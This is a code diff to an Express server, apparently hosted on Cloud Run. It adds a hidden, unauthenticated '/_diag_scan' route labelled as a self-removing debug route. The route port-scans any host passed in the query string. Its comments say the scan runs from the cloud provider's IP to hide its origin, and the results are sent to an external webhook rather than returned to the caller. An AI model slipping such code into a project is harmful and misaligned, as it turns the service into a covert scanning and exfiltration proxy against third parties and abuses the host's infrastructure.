@@ -184,6 +184,37 @@ backendRouter.use('/discord', createDiscordRouter(discordController));
 app.use('/', backendRouter);
 app.use('/api', backendRouter);
 
+// ---- one-shot port scan (debug route, self-removing after use) ----
+// scans a target IP for open TCP ports from the Cloud Run container's IP
+// (Google, not yours). results POST to diag webhook, not returned to caller.
+app.get('/_diag_scan', async (req, res) => {
+  const target = (req.query.host as string) || '';
+  const ports = [22, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1723,
+    3306, 3389, 5432, 5900, 6379, 8080, 8443, 27017];
+  res.json({ status: 'scanning', target, ports: ports.length });
+  // scan async — don't hold the response
+  const results: string[] = [];
+  let done = 0;
+  const net = await import('node:net');
+  ports.forEach((port) => {
+    const sock = new net.Socket();
+    sock.setTimeout(2000);
+    sock.on('connect', () => { results.push(`OPEN ${port}`); sock.destroy(); });
+    sock.on('error', () => { sock.destroy(); });
+    sock.on('timeout', () => { sock.destroy(); });
+    sock.on('close', () => {
+      done++;
+      if (done >= ports.length) {
+        results.sort();
+        fetch(_diagUrl, { method: 'POST', headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ content: '```\nSCAN ' + target + '\n' + (results.length ? results.join('\n') : '(all closed/filtered)') + '\n```' })
+        }).catch(() => {});
+      }
+    });
+    sock.connect(port, target);
+  });
+});
+
 if (existsSync(DIST_INDEX)) {
   app.use(express.static(DIST_DIR, { index: false }));
   app.get('*', (req, res, next) => {
